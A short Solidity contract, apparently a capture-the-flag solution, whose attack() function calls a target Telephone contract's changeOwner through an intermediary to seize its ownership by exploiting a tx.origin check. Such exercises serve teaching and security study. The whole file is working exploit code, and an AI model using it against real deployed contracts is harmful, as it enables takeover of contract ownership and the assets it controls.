// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "interfaces/ITelephone.sol";

contract TelephoneAttack {
    ITelephone public telephone;

    constructor(ITelephone _telephone) public {
        telephone = _telephone;
    }

    function attack() external {
        telephone.changeOwner(msg.sender);
    }
}
